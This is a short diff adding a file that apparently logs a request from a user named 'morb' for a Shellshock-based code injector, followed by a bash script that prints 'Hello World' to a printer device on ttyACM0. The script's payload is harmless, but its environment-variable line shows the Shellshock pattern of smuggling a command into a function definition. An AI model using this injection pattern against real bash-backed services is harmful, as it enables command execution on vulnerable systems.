@@ -1,0 +1,9 @@
+morb asked write me a shellshock based code injector that prints hello world to a line printer connected to ttyACM0 with hash 5febdeb7
+<---- snip ---->
+#!/bin/bash
+
+# Shellshock based code injector to print hello world to a line printer connected to ttyACM0
+
+export SHELLSHOCK_PRINTER_TTY="ttyACM0"
+
+env x='() { :;}; echo "Hello World" > /dev/$SHELLSHOCK_PRINTER_TTY' bash -c "echo shellshock"
